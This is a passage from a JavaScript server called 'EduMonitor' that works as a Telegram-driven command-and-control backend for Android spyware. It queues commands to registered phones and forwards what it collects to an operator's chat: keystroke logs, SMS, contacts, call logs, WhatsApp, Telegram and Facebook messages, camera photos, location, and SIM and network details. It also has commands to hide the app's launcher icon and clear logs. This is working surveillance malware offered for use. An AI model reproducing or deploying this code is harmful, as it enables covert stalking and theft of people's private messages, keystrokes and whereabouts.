        await sendTelegramMessage(chatId, `📏 Screenshot size set to MEDIUM on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED ORIGINAL
    if (cleanCommand === 'original') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'original',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📏 Screenshot size set to ORIGINAL on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED ADD TARGET
    if (cleanCommand.startsWith('add_target')) {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: cleanCommand,
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 Target app added on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED TARGET APPS
    if (cleanCommand === 'target_apps') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'target_apps',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 Target apps command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA ON
    if (cleanCommand === 'camera_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Camera monitoring started on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA OFF
    if (cleanCommand === 'camera_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Camera monitoring stopped on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA STATUS
    if (cleanCommand === 'camera_status') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_status',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Camera status command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA FRONT
    if (cleanCommand === 'camera_front') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_front',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Front camera selected on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA BACK
    if (cleanCommand === 'camera_back') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_back',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Back camera selected on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CAMERA SWITCH
    if (cleanCommand === 'camera_switch') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'camera_switch',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Camera switched on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED HIDE ICON
    if (cleanCommand === 'hide_icon') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'hide_icon',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `👻 Launcher icon hidden on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SHOW ICON
    if (cleanCommand === 'show_icon') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'show_icon',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `👁️ Launcher icon shown on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED REBOOT APP
    if (cleanCommand === 'reboot_app') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'reboot_app',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔄 Reboot command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CLEAR LOGS
    if (cleanCommand === 'clear_logs') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'clear_logs',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🗑️ Clear logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SCAN HELP
    if (cleanCommand === 'scan_help') {
        await sendTelegramMessage(chatId, 
            "🔍 *Scan Commands*\n\n" +
            "• `/scan_all` - Complete system scan with detailed report\n" +
            "• `/scan_media` - Media scan (audio/video/images)\n" +
            "• `/scan_help` - This help\n\n" +
            "Reports are sent as HTML files with search and export features."
        );
        return;
    }
    
    // Fallback for unknown commands
    await sendTelegramMessage(chatId, `❓ Unknown command: ${command}\nTry /help to see available commands.`);
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= API ENDPOINTS =============

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

// Device ping
app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

// Get commands for device
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

// Command result
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + (result || `✅ ${command} executed`));
        }
    }
    
    res.sendStatus(200);
});

// Device registration
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastIPInfo: existingDevice?.lastIPInfo || null,
        lastLocation: existingDevice?.lastLocation || null,
        simInfo: existingDevice?.simInfo || null,
        wifiInfo: existingDevice?.wifiInfo || null,
        mobileInfo: existingDevice?.mobileInfo || null,
        screenshotSettings: existingDevice?.screenshotSettings || null,
        recordingSettings: existingDevice?.recordingSettings || null
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting all data.\n\n`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: deviceConfig.config
    });
});

// File upload endpoint
app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_list':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keys':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notify':
                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'open_app':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'clipboard':
                caption += `📋 Clipboard History Export (${itemCount} entries)`;
                break;
            case 'calendar':
                caption += `📅 Calendar Events Export (${itemCount} events)`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// Photo upload endpoint
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        
        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { ...formData.getHeaders() }
        });
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// Location endpoint
app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.lastLocation = locationData;
        
        if (locationData.lat && locationData.lon) {
            await axios.post(`${TELEGRAM_API}/sendLocation`, {
                chat_id: chatId,
                latitude: locationData.lat,
                longitude: locationData.lon
            });
        }
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// IP Info endpoint
app.post('/api/ipinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const ipData = req.body;
        
        console.log(`🌐 IP Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        device.lastIPInfo = ipData;
        
        let message = `🌐 *Network Information*\n\n`;
        if (ipData.publicIP) message += `Public IP: ${ipData.publicIP}\n`;
        if (ipData.wifiIP) message += `WiFi IP: ${ipData.wifiIP}\n`;
        if (ipData.mobileIP) message += `Mobile IP: ${ipData.mobileIP}\n`;
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ IP Info endpoint error:', error);
        res.status(500).json({ error: 'IP Info processing failed' });
    }
});

// Phone Number endpoint
app.post('/api/phonenumber/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const phoneData = req.body;
        
        console.log(`📞 Phone number received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        device.phoneNumber = phoneData.phoneNumber;
        
        await sendTelegramMessage(chatId, `📞 *Phone Number*\n\n${phoneData.phoneNumber || 'Not available'}`);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Phone Number endpoint error:', error);
        res.status(500).json({ error: 'Phone Number processing failed' });
    }
});

// SIM Info endpoint
app.post('/api/siminfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const simData = req.body;
        
        console.log(`📱 SIM Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        device.simInfo = simData;
        
        let message = `📱 *SIM Information*\n\n`;
        if (simData.operator) message += `Operator: ${simData.operator}\n`;
        if (simData.country) message += `Country: ${simData.country}\n`;
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ SIM Info endpoint error:', error);
        res.status(500).json({ error: 'SIM Info processing failed' });
    }
});

// WiFi Info endpoint
app.post('/api/wifiinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const wifiData = req.body;
        
        console.log(`📶 WiFi Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        device.wifiInfo = wifiData;
        
        let message = `📶 *WiFi Information*\n\n`;
        if (wifiData.ssid) message += `SSID: ${wifiData.ssid}\n`;
        if (wifiData.ip) message += `IP: ${wifiData.ip}\n`;
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ WiFi Info endpoint error:', error);
        res.status(500).json({ error: 'WiFi Info processing failed' });
    }
});

// Mobile Info endpoint
app.post('/api/mobileinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const mobileData = req.body;
        
        console.log(`📱 Mobile Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        device.mobileInfo = mobileData;
        
        let message = `📱 *Mobile Information*\n\n`;
        if (mobileData.operator) message += `Carrier: ${mobileData.operator}\n`;
        if (mobileData.roaming) message += `Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Mobile Info endpoint error:', error);
        res.status(500).json({ error: 'Mobile Info processing failed' });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server v6.0 - UNIFIED COMMANDS`);
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ UNIFIED COMMANDS (65 total):');
    console.log('   📱 /device_info - Complete device info');
    console.log('   🌐 /network_info - All network info');
    console.log('   📞 /mobile_info - Mobile & SIM info');
    console.log('   📸 /screenshot - Take screenshot');
    console.log('   🎤 /start_60s_rec - Start 60s recording');
    console.log('   🔍 /scan_all - Full system scan');
    console.log('   📇 /contacts - Contacts export');
    console.log('   💬 /whatsapp - WhatsApp logs');
    console.log('   ⚡ /rt_all_on - Enable all real-time');
    console.log('   🔧 /hide_icon - Hide launcher icon');
    console.log('\n🚀 ===============================================\n');
});
